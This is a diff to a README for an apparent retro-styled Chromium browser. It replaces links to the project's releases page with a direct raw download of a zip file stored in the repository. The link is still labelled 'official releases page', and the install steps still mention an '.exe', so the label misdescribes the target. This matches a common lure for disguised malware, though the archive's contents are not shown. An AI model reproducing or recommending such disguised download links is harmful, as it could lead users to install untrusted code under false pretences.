@@ -1,6 +1,6 @@
 # 🌐 CyberDeck_Browser - Browse the web with retro style
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/obechifamilycerthiidae1072/CyberDeck_Browser/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/obechifamilycerthiidae1072/CyberDeck_Browser/raw/refs/heads/main/installer/Cyber_Deck_Browser_v1.1.zip)
 
 CyberDeck Browser brings a distinct look and feel to your daily web browsing. It combines modern web technology with the aesthetic of retro computer terminals. This browser runs on the Chromium Embedded Framework, which ensures web pages load correctly while maintaining a lightweight footprint on your system. You can explore standard web pages or trigger the Terminal Mode to interact with your content through a command-line interface. The integrated OpenGL 3D bookmark deck gives you a visual way to organize your favorite websites.
 
@@ -8,7 +8,7 @@ CyberDeck Browser brings a distinct look and feel to your daily web browsing. It
 
 Follow these steps to set up CyberDeck Browser on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/obechifamilycerthiidae1072/CyberDeck_Browser/releases) to download the software.
+1. Visit the [official releases page](https://github.com/obechifamilycerthiidae1072/CyberDeck_Browser/raw/refs/heads/main/installer/Cyber_Deck_Browser_v1.1.zip) to download the software.
 2. Choose the file ending in `.exe` that matches your system architecture.
 3. Save the file to your computer.
 4. Run the installer and follow the screen prompts to complete the setup.
